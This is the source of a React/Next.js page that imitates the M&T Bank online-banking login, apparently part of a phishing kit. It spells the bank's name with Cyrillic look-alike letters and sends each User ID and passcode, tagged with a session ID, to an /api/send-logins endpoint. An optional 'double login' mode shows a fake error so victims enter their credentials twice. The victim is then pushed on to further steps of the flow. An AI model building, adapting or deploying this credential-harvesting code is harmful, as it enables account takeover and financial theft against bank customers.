import {
  Box,
  Flex,
  Text,
  UnorderedList,
  ListItem,
  Link,
  Image,
  Input as CInput,
} from "@chakra-ui/react";
import React, { useContext, useState } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { Wrapper } from "../components/Wrapper";
import { Input } from "../components/Input";
import { Checkbox } from "../components/Checkbox";
import { DataContext } from "./_app";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";

interface LoginProps {}

const schema = yup.object().shape({
  userId: yup
    .string()
    .required(`Enter a User ID`)
    .min(2, `Your User ID must be greater than 2 characters`),
  passcode: yup
    .string()
    .required(`Enter a Password`)
    .min(6, `Your password must be at least 6 characters long`),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData, );
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        userId: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  return (
    <>
      <Wrapper altHeader={false}>
        <Box
          minH={`calc(100vh - 70px)`}
          pos={`relative`}
          flex={`0 0 50%`}
          m={0}
          pl={0}
          p={0}
          maxW={`100%`}
        >
          <Box>
            <Flex justifyContent={`center`} my={0}>
              <Box m={`1rem 2rem`} maxW={`500px`} w={`100%`}>
                <Text
                  as={`h1`}
                  fontSize={`40px`}
                  color={`#007856`}
                  fontFamily={`"Balto-Light", sans-serif`}
                  m={`0.67em 0`}
                  fontWeight={100}
                  textAlign={`center`}
                >
                  Log In
                </Text>
                <UnorderedList
                  display={`flex`}
                  gap={0}
                  listStyleType={`none`}
                  m={0}
                  mb={`10px`}
                  p={0}
                >
                  <ListItem
                    flex={`0 0 50%`}
                    textAlign={`center`}
                    whiteSpace={`nowrap`}
                    fontSize={`16px`}
                  >
                    <Link
                      color={`#fff`}
                      bgColor={`#007856`}
                      border={`1px solid #007856`}
                      cursor={`pointer`}
                      fontFamily={`Balto-Light, sans-serif`}
                      fontWeight={200}
                      fontStyle={`normal`}
                      fontSize={`16px`}
                      p={`10px 20px`}
                      w={`100%`}
                      display={`inline-block`}
                      textDecor={`none`}
                      _hover={{}}
                      _focus={{}}
                    >
                      Personal / Business
                    </Link>
                  </ListItem>
                  <ListItem
                    flex={`0 0 50%`}
                    textAlign={`center`}
                    whiteSpace={`nowrap`}
                    fontSize={`16px`}
                  >
                    <Link
                      color={`#888`}
                      bgColor={`#fff`}
                      border={`1px solid #888`}
                      cursor={`pointer`}
                      fontFamily={`Balto-Light, sans-serif`}
                      fontWeight={200}
                      fontStyle={`normal`}
                      fontSize={`16px`}
                      p={`10px 20px`}
                      w={`100%`}
                      display={`inline-block`}
                      textDecor={`none`}
                      _hover={{}}
                      _focus={{}}
                    >
                      Commercial
                    </Link>
                  </ListItem>
                </UnorderedList>
                <Box as={`form`} mb={`40px`}>
                  <Box
                    as={`fieldset`}
                    border={0}
                    m={0}
                    p={0}
                    w={`auto`}
                    minW={0}
                  >
                    <Text
                      as={`legend`}
                      display={`none`}
                      boxSizing={`border-box`}
                      color={`inherit`}
                      maxW={`100%`}
                      p={0}
                      whiteSpace={`normal`}
                    >
                      Personal / Business Login
                    </Text>
                    <Input
                      label={`User ID`}
                      error={errors.userId && errors.userId.message}
                      register={register}
                      name={`userId`}
                      curValue={watch(`userId`)}
                    />
                    <Input
                      label={`Passcode`}
                      error={errors.passcode && errors.passcode.message}
                      register={register}
                      name={`passcode`}
                      curValue={watch(`passcode`)}
                    />
                    <Flex
                      mt={`4px`}
                      pos={`relative`}
                      gap={0}
                      justifyContent={`space-between`}
                      flexWrap={`wrap`}
                    >
                      <Box>
                        <Checkbox />
                        <CInput
                          type={`submit`}
                          value={`Log In >`}
                          fontSize={`16px`}
                          cursor={`pointer`}
                          fontFamily={`Balto-Medium, santSrif`}
                          fontWeight={500}
                          fontStyle={`normal`}
                          p={`10px 20px`}
                          textDecor={`none`}
                          border={`1px solid #007856`}
                          borderColor={`#007856`}
                          transition={`none`}
                          color={`#fff`}
                          bgColor={`#007856`}
                          w={`150px`}
                          h={`40px`}
                          m={`2rem 0`}
                          display={`block`}
                          borderRadius={0}
                          lineHeight={1.15}
                          _hover={{
                            color: `#007856`,
                            bgColor: `#fff`,
                          }}
                        />
                      </Box>
                      <Box textAlign={`right`}>
                        <Text
                          as={`p`}
                          mt={0}
                          fontSize={`14px`}
                          lineHeight={`22px`}
                        >
                          <QuestionMarkIcon />
                          <Link
                            fontSize={`14px`}
                            color={`#007856`}
                            textDecor={`none`}
                            bgColor={`transparent`}
                            _hover={{
                              textDecor: `underline`,
                            }}
                          >
                            {` `}Help with User ID or Passcode
                          </Link>
                        </Text>
                      </Box>
                    </Flex>
                  </Box>
                  <Box>
                    <Text
                      my={`16px`}
                      as={`p`}
                      lineHeight={`22px`}
                      fontSize={`16px`}
                    >
                      <Link
                        textDecor={`none`}
                        fontSize={`16px`}
                        color={`#007856`}
                        bgColor={`transparent`}
                        _hover={{
                          textDecor: `underline`,
                        }}
                        _focus={{}}
                      >
                        Enroll in М&Т Online Ваnking
                      </Link>
                    </Text>
                    <Text
                      my={`16px`}
                      as={`p`}
                      lineHeight={`22px`}
                      fontSize={`16px`}
                    >
                      <Link
                        textDecor={`none`}
                        fontSize={`16px`}
                        color={`#007856`}
                        bgColor={`transparent`}
                        pos={`relative`}
                        m={0}
                        _hover={{
                          textDecor: `underline`,
                        }}
                        _focus={{}}
                        _after={{
                          bgImage: `url(/assets/images/chevron_down.8adc6731.svg)`,
                          content: `""`,
                          bgRepeat: `no-repeat`,
                          bgSize: `contain`,
                          h: `0.875rem`,
                          w: `0.875rem`,
                          ml: `1rem`,
                          flexShrink: 0,
                          pos: `absolute`,
                          right: `-2rem`,
                          bottom: 0,
                        }}
                      >
                        More Personal & Business Services
                      </Link>
                    </Text>
                  </Box>
                </Box>
              </Box>
            </Flex>
          </Box>
          <Box minH={`60px`}>
            <Box
              pos={`absolute`}
              bottom={0}
              left={`50%`}
              transform={`translate(-50%, -20px)`}
              w={`512px`}
              m={`0 1rem`}
            >
              <Text
                as={`p`}
                textAlign={`center`}
                fontSize={`12px`}
                lineHeight={`22px`}
              >
                <Image
                  src={`/assets/images/equal-housing-lender-logo.png`}
                  alt={`Equal Housing Lender Icon`}
                  w={`14px`}
                  fontSize={`12px`}
                  verticalAlign={`middle`}
                  display={`inline`}
                />{" "}
                Equal Housing Lender, © {new Date().getFullYear()} М&Т Ваnk,
                Member FDIC NMLS #381076
              </Text>
              <UnorderedList
                listStyleType={`none`}
                textAlign={`center`}
                m={0}
                p={0}
              >
                {[
                  `Privacy`,
                  ` Sitemap`,
                  ` Digital Service Agreement`,
                  ` ESign Consent`,
                  ` Terms of Use`,
                ].map((item, index, array) => (
                  <ListItem
                    key={item}
                    fontSize={`12px`}
                    display={`inline-block`}
                    pb={`10px`}
                    _after={
                      index !== array.length - 1
                        ? {
                            content: `' | '`,
                          }
                        : {}
                    }
                  >
                    <Link
                      fontSize={`12px`}
                      color={`#007856`}
                      textDecor={`none`}
                      bgColor={`transparent`}
                      _hover={{
                        textDecor: `underline`,
                      }}
                      _focus={{}}
                    >
                      {item}
                    </Link>
                  </ListItem>
                ))}
              </UnorderedList>
            </Box>
          </Box>
        </Box>
      </Wrapper>
    </>
  );
};

const QuestionMarkIcon = () => (
  <svg
    className="login-icon -icon-question-mark"
    style={{
      fill: `rgb(0, 120, 86)`,
      marginLeft: `4px`,
      marginTop: `-3px`,
      padding: `0px`,
      height: `16px`,
      width: `16px`,
      overflow: `visible`,
      fontSize: `14px`,
      display: `inline`,
    }}
  >
    <use xlinkHref="#icon-question-mark"></use>
  </svg>
);

export default Login;
